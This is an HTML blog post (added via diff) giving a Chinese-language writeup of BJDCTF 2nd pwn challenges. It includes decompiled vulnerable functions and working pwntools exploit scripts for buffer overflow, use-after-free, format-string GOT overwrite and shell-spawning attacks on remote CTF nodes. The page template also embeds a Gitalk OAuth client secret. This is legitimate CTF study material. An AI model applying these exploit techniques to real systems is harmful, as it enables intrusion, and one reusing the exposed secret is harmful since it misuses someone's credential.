@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+  <title>BJDCTF 2nd pwn writeup - 广莫之野</title>
+  <meta charset="UTF-8">
+  <meta name="description" content>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="/home.png" type="image/png">
+  <meta name="description" content="BJDCTF 2nd pwn题的wp">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BJDCTF 2nd pwn writeup">
+<meta property="og:url" content="http://shiroinu.top/2020/03/22/buuctf-wp/index.html">
+<meta property="og:site_name" content="广莫之野">
+<meta property="og:description" content="BJDCTF 2nd pwn题的wp">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-03-22T12:56:52.912Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BJDCTF 2nd pwn writeup">
+<meta name="twitter:description" content="BJDCTF 2nd pwn题的wp">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1584889637947">
+</head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(/images/back1.png)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="tsts" class="mdui-btn mdui-btn-icon"><img src="/images/head.png"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="tsts">
+            <img src="/images/head.png" alt="tsts">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>14</div>
+        <div><span>标签</span>2</div>
+        <div><span>分类</span>0</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/killthatshaman/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">标签云</h3>
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
+      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a>
+    </div>
+    
+  </div>
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2020 tsts
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+            <img src="/images/back1.png">
+        
+        <h1>BJDCTF 2nd pwn writeup</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2020年03月22日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 5 分钟</a>
+    
+    
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
+    
+  </div>
+  <article>
+    <p>BJDCTF 2nd pwn题的wp</p>
+<a id="more"></a>
+<h1 id="r2t3"><a href="#r2t3" class="headerlink" title="r2t3"></a>r2t3</h1><p>basic rop,<code>ret2text</code>,没什么好说的,漏洞点在<code>name_check</code>函数里面</p>
+<pre><code class="c">char *__cdecl name_check(char *s)
+{
+  char dest; // [esp+7h] [ebp-11h]
+  unsigned __int8 v3; // [esp+Fh] [ebp-9h]
+
+  v3 = strlen(s);
+  if ( v3 &lt;= 3u || v3 &gt; 8u )
+  {
+    puts(&quot;Oops,u name is too long!&quot;);
+    exit(-1);
+  }
+  printf(&quot;Hello,My dear %s&quot;, s);
+  return strcpy(&amp;dest, s);
+}</code></pre>
+<p><code>v3</code>是<code>int8</code>直接构造整数溢出即可，这年头直接给后门函数的rop题不多了。</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *
+#sh = process(&#39;./r2t3&#39;)
+sh = remote(&#39;node3.buuoj.cn&#39;,28755)
+system = 0x0804858b
+#gdb.attach(sh)
+#context.log_level = &#39;DEBUG&#39;
+payload = &#39;a&#39; * 0x15 +p32(system)
+payload += &#39;a&#39; * (0x106 - len(payload))
+sh.recvuntil(&quot;[+]Please input your name:\n&quot;)
+
+sh.sendline(payload)
+sh.interactive()</code></pre>
+<h1 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h1><p><code>libc_2.29</code>的one_gedget题，基本白给。</p>
+<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
+from LibcSearcher import LibcSearcher
+sh = remote(&#39;node3.buuoj.cn&#39;,26087)
+#sh = process(&#39;./one_gadget&#39;)
+sh.recvuntil(&#39;:&#39;)
+printf_addr = int(sh.recvuntil(&#39;\n&#39;)[:-1],16)
+#libc = LibcSearcher(&quot;printf&quot;,printf_addr)
+libc_base = printf_addr - 0x62830
+one_gadget = libc_base + 0x106ef8
+sh.recvuntil(&#39;Give me your one gadget:&#39;)
+sh.sendline(str(one_gadget))
+sh.interactive()</code></pre>
+<h1 id="ydsneedgirlfriend2"><a href="#ydsneedgirlfriend2" class="headerlink" title="ydsneedgirlfriend2"></a>ydsneedgirlfriend2</h1><p>因为<code>delele</code>之后指针未置0，所以再次<code>add</code>的时候会跳过第一个malloc(0x10)，所以在<code>delete</code>之后令name_size = 0x10,malloc(0x10)获取<code>girlfriend[0]</code>，修改fd指针,<code>show</code>即可getshell.</p>
+<h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
+context.log_level = &#39;DEBUG&#39;
+backdoor = 0x400d86
+#sh = process(&#39;./ydsneedgirlfriend2&#39;)
+sh = remote(&#39;node3.buuoj.cn&#39;,29361)
+def add(size,name):
+    sh.sendline(&quot;1&quot;)
+    sh.recvuntil(&#39;Please input the length of her name:\n&#39;)
+    sh.sendline(str(size))
+    sh.recvuntil(&#39;Please tell me her name:\n&#39;)
+    sh.sendline(name)
+    sh.recvuntil(&quot;u choice :\n&quot;)
+
+def delete(index):
+    sh.sendline(&#39;2&#39;)
+    sh.recvuntil(&#39;Index :&#39;)
+    sh.sendline(str(index))
+    sh.recvuntil(&quot;u choice :\n&quot;)
+
+sh.recvuntil(&quot;u choice :\n&quot;)
+add(0x60,&#39;aa&#39;)
+#gdb.attach(sh)
+delete(0)
+payload = p64(0) + p64(backdoor)
+
+add(0x10,payload)
+sh.sendline(&#39;3&#39;)
+sleep(0.2)
+sh.sendline(&#39;0&#39;)
+sh.interactive()</code></pre>
+<h1 id="r2t4"><a href="#r2t4" class="headerlink" title="r2t4"></a>r2t4</h1><p>格式化字符串漏洞，坑点在<code>fini_array</code>不可写，于是写<code>stack_chk_fail</code>的got表为<code>backdoor</code>来getshell.</p>
+<h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
+#sh = process(&#39;./r2t4&#39;)
+sh = remote(&#39;node3.buuoj.cn&#39;,26709)
+backdoor = 0x400626
+fini_array = 0x600E18
+bss_addr = 0x601050
+got_chk_fail = 0x601018
+context.log_level = &#39;DEBUG&#39;
+string =  &#39;aaaaa%1569c%8$hn&#39;
+#string = &#39;aaaaaaaaaaaa%8$p&#39;
+string += p64(got_chk_fail)
+string += &#39;a&#39; * 0x20
+#gdb.attach(sh)
+sh.sendline(string)
+#log.info(sh.recv())
+sh.interactive()</code></pre>
+<h1 id="test"><a href="#test" class="headerlink" title="test"></a>test</h1><p>有毒的指令过滤绕过，我是真的不会这种题目<em>(:з」∠)</em><br>由wood师傅提出的<code>od ????</code>利用通配符和<code>od</code>指令输出，但是这样获取的是一堆颠倒的八进制数据(小端序)，写一个python脚本转换成flag.</p>
+<h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">import binascii
+from pwn import *
+asc =&#39;&#39;&#39;
+066146 063541 033573 030062 061545 061545 026543 034461
+032543 032055 062464 026463 031142 061146 061455 034541
+061143 034063 060471 060546 076461 
+&#39;&#39;&#39;
+flag = &#39;&#39;
+for i in range(1,len(asc),7):
+    a = asc[i:i+6]
+    log.info(&#39;a = &#39; + a)
+    num = int(a,8)
+    h = hex(num)[2:]
+    s = binascii.a2b_hex(h)
+    s = s[::-1]
+    log.info(s)
+    flag += s
+    log.success(flag)</code></pre>
+<h1 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h1><p>漏洞点在<code>welcome</code>函数的<br><code>buf[(signed int)((unsigned __int64)read(0, buf, 0x16uLL) - 1)] = 0;</code><br>读入0x16字节,能覆盖到后面的<code>times_ptr</code>，而每过一关<code>*(ptr)</code>的值都会-1，使用gdb调试时发现<code>printf</code>和<code>system</code>的got表中内容只相差0x10，因此修改<code>ptr</code>指针为<code>got_printf</code>,手动过16次，再故意输错触发<code>gameover</code>中的<code>printf(buf)</code>(此时got表已经为system的值)来getshell。</p>
+<pre><code class="c">unsigned __int64 welcome()
+{
+  unsigned int i; // [rsp+Ch] [rbp-54h]
+  char s; // [rsp+10h] [rbp-50h]
+  unsigned __int64 v3; // [rsp+58h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  *(_DWORD *)times_ptr = 10000;
+  for ( i = 0; i &lt;= 9; ++i )
+    buf[i] = 0;
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  puts(&quot;@====================================@&quot;);
+  print_str(&quot;# What&#39;s your name? ________________ #&quot;, 20);
+  buf[(signed int)((unsigned __int64)read(0, buf, 0x16uLL) - 1)] = 0;
+  sprintf(&amp;s, &quot;#      Welcome %-16s      #&quot;, buf);
+  puts(&amp;s);
+  puts(&quot;#====================================#&quot;);
+  puts(&quot;#    I have toooooo many secrets &gt;   #&quot;);
+  puts(&quot;#        Can u find them _&lt;          #&quot;);
+  puts(&quot;#====================================#&quot;);
+  return __readfsqword(0x28u) ^ v3;
+}
+
+unsigned __int64 get_secret()
+{
+  char buf; // [rsp+0h] [rbp-20h]
+  unsigned __int64 v2; // [rsp+18h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  print_str(&quot;#           Secret: _____            #&quot;, 20);
+  read(0, &amp;buf, 0xAuLL);
+  secret = atoi(&amp;buf);
+  --*(_DWORD *)times_ptr;
+  return __readfsqword(0x28u) ^ v2;
+}
+
+void __noreturn gameover()
+{
+  puts(&quot;#====================================#&quot;);
+  puts(&quot;#             GAME OVER              #&quot;);
+  puts(&quot;#====================================#&quot;);
+  print_str(&quot;#        BYE BYE~                    #&quot;, 18);
+  printf(buf, 18LL);
+  puts(&amp;zer0);
+  puts(&quot;@====================================@&quot;);
+  exit(0);
+}</code></pre>
+<h2 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
+import os
+context.log_level = &quot;DEBUG&quot;
+
+l = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3F7D,0x357A,0x3CF5,0x2F9E,0x41EA,0x48D8,0x2763,0x474C,0x3809,0x2E63]
+payload = &#39;/bin/sh\x00aaaaaaaa\x40\xd0\x46\x00\x00&#39;
+#sh = process(&#39;./secret&#39;)
+sh =remote(&#39;node3.buuoj.cn&#39;,28520)
+sh.recvuntil(&#39;What\&#39;s your name?&#39;)
+sh.sendline(payload)
+sh.recvuntil(&#39;Secret:&#39;)
+#gdb.attach(sh)
+for i in range(len(l)):
+    sh.sendline(str(l[i]))
+    sh.recvuntil(&#39;Secret:&#39;)
+#gdb.attach(sh)
+sh.sendline(&#39;1&#39;)
+sh.interactive()</code></pre>
+
+  </article>
+  
+    
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1584889637954"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+
+
+  
+
+
+
+
+
+</body>
+
+</html>
